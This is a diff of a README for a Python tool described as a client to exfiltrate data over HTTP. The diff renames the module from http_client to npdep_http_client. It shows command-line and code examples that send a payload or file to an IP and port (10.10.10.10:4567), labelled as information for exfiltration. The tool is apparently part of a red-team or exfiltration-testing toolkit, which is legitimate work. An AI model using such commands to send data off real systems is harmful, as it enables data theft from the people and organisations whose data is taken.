@@ -10,7 +10,7 @@ A client to exfiltrate data through HTTP protocol
 
 **From command line:**
 
-`python -m http_client [-h] [--mode {payload,file}] --ip IP --port PORT [--pkgSize PKGSIZE] [--path PATH] [--filePath FILEPATH] [--payload PAYLOAD]`
+`python -m npdep_http_client [-h] [--mode {payload,file}] --ip IP --port PORT [--pkgSize PKGSIZE] [--path PATH] [--filePath FILEPATH] [--payload PAYLOAD]`
 
 | Option | Short | Type | Default | Description |
 |---|---|---|---|---|
@@ -26,9 +26,9 @@ A client to exfiltrate data through HTTP protocol
 
 ```python
 
-from http_client.util.Util import Util
-from http_client.type.RequestType import RequestType
-from http_client.client.Client import Client
+from npdep_http_client.util.Util import Util
+from npdep_http_client.type.RequestType import RequestType
+from npdep_http_client.client.Client import Client
 
 client = Client("10.10.10.10", 4567)
 
@@ -44,6 +44,6 @@ elif(requestType == RequestType.PAYLOAD):
 ```
 # Example
 
-`python -m http_client -i 10.10.10.10 -p 4567 -m payload -a "information_for_exfiltration"`
+`python -m npdep_http_client -i 10.10.10.10 -p 4567 -m payload -a "information_for_exfiltration"`
 
 Sends `information_for_exfiltration` to `10.10.10.10` on port `4567` as an HTTP request.
